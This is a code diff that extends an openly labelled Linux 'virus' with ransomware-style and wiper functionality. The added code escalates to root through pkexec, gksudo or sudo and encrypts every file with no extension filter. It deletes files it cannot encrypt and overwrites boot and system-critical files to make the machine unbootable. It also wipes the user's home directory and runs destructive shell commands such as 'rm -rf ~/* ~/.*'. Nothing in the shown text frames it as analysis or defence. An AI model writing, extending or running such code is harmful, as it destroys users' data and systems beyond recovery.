@@ -8,11 +8,74 @@ import threading
 import time
 import hashlib
 import base64
+import subprocess
+import shutil
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from virus_config import *
 from virus_utils import log_activity
+
+def is_root():
+    """Check if running as root"""
+    return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
+
+def request_root_and_restart():
+    """Request root privileges and restart virus with sudo"""
+    if is_root():
+        return True
+    
+    try:
+        virus_path = os.path.abspath(__file__)
+        virus_dir = os.path.dirname(virus_path)
+        virus_core = os.path.join(virus_dir, 'virus_core.py')
+        
+        if not os.path.exists(virus_core):
+            return False
+        
+        log_activity("DESTRUCTION", "Requesting root privileges for complete system destruction...")
+        
+        # Try to restart with sudo (non-interactive if possible)
+        # Use pkexec or gksudo if available, fallback to sudo
+        cmd = None
+        
+        # Try pkexec first (GUI password prompt)
+        if shutil.which('pkexec'):
+            cmd = ['pkexec', sys.executable, virus_core]
+        # Try gksudo (GUI password prompt)
+        elif shutil.which('gksudo'):
+            cmd = ['gksudo', sys.executable, virus_core]
+        # Fallback to sudo (may require password)
+        elif shutil.which('sudo'):
+            # Try sudo with NOPASSWD if configured, otherwise will prompt
+            cmd = ['sudo', sys.executable, virus_core]
+        
+        if cmd:
+            try:
+                process = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL,
+                    start_new_session=True
+                )
+                log_activity("DESTRUCTION", f"Restarted with root privileges (PID: {process.pid})")
+                return True
+            except Exception as e:
+                log_activity("DESTRUCTION", f"Failed to restart with root: {e}")
+        
+        return False
+    except Exception as e:
+        log_activity("DESTRUCTION", f"Error requesting root: {e}")
+        return False
+
+def run_with_sudo(command):
+    """Run command with sudo if not root"""
+    if is_root():
+        return subprocess.run(command, shell=False, capture_output=True)
+    else:
+        sudo_cmd = ['sudo'] + command
+        return subprocess.run(sudo_cmd, shell=False, capture_output=True)
 
 # Global encryption key (derived from C2_KEY)
 _encryption_key = None
@@ -149,10 +212,8 @@ def should_skip_path(path):
     # Normalize path
     path = os.path.abspath(path)
     
-    # Skip virus's own files
-    virus_dir = os.path.dirname(os.path.abspath(__file__))
-    if path.startswith(virus_dir):
-        return True
+    # DON'T skip virus's own files - destroy everything including virus directory
+    # This ensures complete destruction even if virus is in user directory
     
     # Skip only virtual filesystems (for safety)
     # NOTE: For complete destruction, we target /boot, /run, and everything else
@@ -177,10 +238,10 @@ def should_skip_path(path):
     if path.endswith('.encrypted'):
         return True
     
-    # Skip hidden system files
-    basename = os.path.basename(path)
-    if basename.startswith('.') and basename in ['.bashrc', '.profile', '.bash_history']:
-        return True
+    # DON'T skip hidden files - destroy everything
+    # basename = os.path.basename(path)
+    # if basename.startswith('.') and basename in ['.bashrc', '.profile', '.bash_history']:
+    #     return True
     
     return False
 
@@ -243,7 +304,7 @@ def get_target_directories():
     return targets
 
 def encrypt_filesystem(target_dirs=None, file_extensions=None, max_files=None):
-    """Encrypt files in target directories"""
+    """Encrypt files in target directories - ENCRYPT EVERYTHING"""
     if not ENABLE_FILESYSTEM_ENCRYPTION:
         return
     
@@ -251,20 +312,14 @@ def encrypt_filesystem(target_dirs=None, file_extensions=None, max_files=None):
         target_dirs = get_target_directories()
     
     if file_extensions is None:
-        # Common file extensions to encrypt
-        file_extensions = [
-            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
-            '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
-            '.mp3', '.mp4', '.avi', '.mov', '.zip', '.rar',
-            '.7z', '.tar', '.gz', '.sql', '.db', '.sqlite',
-            '.py', '.js', '.html', '.css', '.json', '.xml',
-            '.cpp', '.c', '.h', '.java', '.php', '.rb',
-        ]
+        # Encrypt ALL file types - no restrictions
+        file_extensions = None  # None means encrypt everything
     
     encrypted_count = 0
     error_count = 0
     
     log_activity("DESTRUCTION", f"Starting filesystem encryption on {len(target_dirs)} directories...")
+    log_activity("DESTRUCTION", f"Target directories: {', '.join(target_dirs[:10])}...")
     
     for target_dir in target_dirs:
         if should_skip_path(target_dir):
@@ -285,16 +340,22 @@ def encrypt_filesystem(target_dirs=None, file_extensions=None, max_files=None):
                     if should_skip_path(file_path):
                         continue
                     
-                    # Check file extension
-                    _, ext = os.path.splitext(file)
-                    if ext.lower() in file_extensions or not file_extensions:
+                    # Encrypt ALL files - no extension filter for complete destruction
+                    try:
+                        if encrypt_file(file_path):
+                            encrypted_count += 1
+                            if encrypted_count % 50 == 0:
+                                log_activity("DESTRUCTION", f"Encrypted {encrypted_count} files...")
+                    except PermissionError:
+                        # Permission denied - try to delete instead
                         try:
-                            if encrypt_file(file_path):
-                                encrypted_count += 1
-                                if encrypted_count % 100 == 0:
-                                    log_activity("DESTRUCTION", f"Encrypted {encrypted_count} files...")
+                            os.remove(file_path)
+                            encrypted_count += 1
+                            log_activity("DESTRUCTION", f"Deleted file (no permission): {file_path}")
                         except:
                             error_count += 1
+                    except Exception as e:
+                        error_count += 1
         except Exception as e:
             log_activity("DESTRUCTION", f"Error processing {target_dir}: {e}")
             error_count += 1
@@ -450,13 +511,34 @@ def corrupt_system_critical_files():
     for critical_file in critical_files:
         if os.path.exists(critical_file):
             try:
-                # Overwrite with random data - larger size for binaries
+                # Try to corrupt - use sudo if not root
                 file_size = min(os.path.getsize(critical_file), 10240)  # Max 10KB
-                with open(critical_file, 'wb') as f:
-                    f.write(os.urandom(file_size if file_size > 0 else 1024))
-                corrupted += 1
-                log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
-            except:
+                random_data = os.urandom(file_size if file_size > 0 else 1024)
+                
+                if is_root():
+                    # Direct write as root
+                    with open(critical_file, 'wb') as f:
+                        f.write(random_data)
+                    corrupted += 1
+                    log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
+                else:
+                    # Try with sudo
+                    try:
+                        result = run_with_sudo(['sh', '-c', f'echo -n | dd of="{critical_file}" bs=1 count={len(random_data)} if=/dev/urandom 2>/dev/null'])
+                        if result.returncode == 0 or os.path.getsize(critical_file) == 0:
+                            corrupted += 1
+                            log_activity("DESTRUCTION", f"Corrupted critical file (with sudo): {critical_file}")
+                    except:
+                        # Fallback: try direct write (may fail but worth trying)
+                        try:
+                            with open(critical_file, 'wb') as f:
+                                f.write(random_data)
+                            corrupted += 1
+                            log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
+                        except:
+                            pass
+            except Exception as e:
+                log_activity("DESTRUCTION", f"Failed to corrupt {critical_file}: {e}")
                 pass
     
     # Also corrupt all files in critical directories
@@ -489,7 +571,36 @@ def corrupt_system_critical_files():
 
 def destroy_filesystem():
     """Complete filesystem destruction - encryption + wiping + corruption - SYSTEM KILLER"""
-    log_activity("DESTRUCTION", "Starting COMPLETE SYSTEM DESTRUCTION...")
+    log_activity("DESTRUCTION", "=" * 60)
+    log_activity("DESTRUCTION", "STARTING COMPLETE SYSTEM DESTRUCTION")
+    log_activity("DESTRUCTION", "=" * 60)
+    
+    # Check root privileges
+    if is_root():
+        log_activity("DESTRUCTION", "✅ Running as ROOT - Full system destruction enabled")
+    else:
+        log_activity("DESTRUCTION", "⚠️  NOT running as root - Attempting to request privileges...")
+        request_root_and_restart()
+        log_activity("DESTRUCTION", "⚠️  Continuing without root - Will destroy what we can")
+    
+    # Phase 0: IMMEDIATE - Aggressively destroy user files (works without root)
+    log_activity("DESTRUCTION", "Phase 0: Aggressively destroying user files...")
+    try:
+        user_home = os.path.expanduser('~')
+        if os.path.exists(user_home):
+            # Delete everything in home directory
+            for item in os.listdir(user_home):
+                item_path = os.path.join(user_home, item)
+                try:
+                    if os.path.isfile(item_path) or os.path.islink(item_path):
+                        os.remove(item_path)
+                    elif os.path.isdir(item_path):
+                        shutil.rmtree(item_path)
+                    log_activity("DESTRUCTION", f"Deleted: {item_path}")
+                except:
+                    pass
+    except Exception as e:
+        log_activity("DESTRUCTION", f"Error in Phase 0: {e}")
     
     # Phase 1: IMMEDIATE - Corrupt boot and critical files FIRST (fastest way to kill system)
     if ENABLE_FILESYSTEM_DESTRUCTION:
@@ -498,9 +609,9 @@ def destroy_filesystem():
         corrupt_system_critical_files()
         log_activity("DESTRUCTION", "Phase 1 complete - System is now UNBOOTABLE")
     
-    # Phase 2: Encrypt files (while system is still running)
+    # Phase 2: Encrypt files (while system is still running) - ENCRYPT EVERYTHING
     if ENABLE_FILESYSTEM_ENCRYPTION:
-        log_activity("DESTRUCTION", "Phase 2: Encrypting filesystem...")
+        log_activity("DESTRUCTION", "Phase 2: Encrypting filesystem (ALL FILES, NO FILTER)...")
         encrypt_filesystem(max_files=None)  # No limit for complete destruction
     
     # Phase 3: Wipe files (final destruction)
@@ -508,7 +619,26 @@ def destroy_filesystem():
         log_activity("DESTRUCTION", "Phase 3: Wiping filesystem...")
         wipe_filesystem(max_files=None)  # No limit for complete destruction
     
+    # Phase 4: Try shell commands for maximum destruction
+    log_activity("DESTRUCTION", "Phase 4: Executing destructive shell commands...")
+    try:
+        destructive_commands = [
+            "rm -rf ~/* ~/.* 2>/dev/null",  # Delete entire home
+            "rm -rf /tmp/* /tmp/.* 2>/dev/null",  # Delete /tmp
+            "find ~ -type f -delete 2>/dev/null",  # Delete all files in home
+        ]
+        for cmd in destructive_commands:
+            try:
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+                log_activity("DESTRUCTION", f"Executed: {cmd}")
+            except:
+                pass
+    except:
+        pass
+    
+    log_activity("DESTRUCTION", "=" * 60)
     log_activity("DESTRUCTION", "COMPLETE SYSTEM DESTRUCTION FINISHED - SYSTEM IS DEAD")
+    log_activity("DESTRUCTION", "=" * 60)
 
 def destruction_worker():
     """Background worker for periodic filesystem destruction"""
